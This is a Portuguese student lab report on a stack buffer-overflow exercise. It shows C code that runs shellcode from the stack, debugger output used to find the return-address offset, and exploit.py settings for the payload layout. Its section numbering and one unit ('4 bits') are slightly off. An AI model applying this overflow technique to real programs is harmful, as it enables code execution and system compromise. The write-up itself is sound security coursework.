# Trabalho realizado na Semana #4

## Tarefa 3

No programa `call_shellcode.d`, é criada uma função func e é colocado no seu endereço de memória um código binário que abre uma shell. 

```c
char code[500];
strcpy(code, shellcode); // Copy the shellcode to the stack
int (*func)() = (int(*)())code;
func(); // Invoke the shellcode from the stack
```

Utilizando o ficheiro `Make` fornecido, são criados dois binários: `a32.out` e `a64.out`. Executando qualquer um destes podemos observar que é aberta uma shell. Isto acontece porque o programa chama a função `func`. No seu endereço de memória está o programa binário, sendo este o código executado.

## Tarefa 3

O primeiro objetivo do debugging é descobrir qual o endereço de retorno, e a posição inicial do buffer:

```bash
$ p $ebp
$1 = (void *) 0xffffcb68

$ p &buffer
$2 = (char (*)[100]) 0xffffcafc

```

Sabendo que o início da posição do buffer é o valor de $2 e a posição do valor de retorno é dado pelo ebp $1, podemos calcular o offset subtraindo os endereços $1- $2, obtendo assim o valor 108.

No entanto, como queremos que a função de retorno aponte para lá do fim da stack somamos também 4 bits ao offset.

Dadas estas informações podemos preencher a seguinte secção do ficheiro exploit.py

```py
# Decide the return address value and put it somewhere in the payload

ret    = 0xffffcb68         
offset = 108 + 4               

```

Para calcular o valor o início do shellcode fomos experimentando diferentes valores tendo em conta que
- este valor mais o tamanho do script não poderá exceder o tamanho do ficheiro
- o endereço de retorno irá apontar para perto daqueles imediatamente após o fim da stack

Por fim chegámos aos seguintes valores:

```py
# Decide the return address value and put it somewhere in the payload

start = 140             
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcb68         # 
offset = 108 + 4                      

```

Que nos permitiram ter sucesso no ataque:

![title](screenshots/5_1.png)

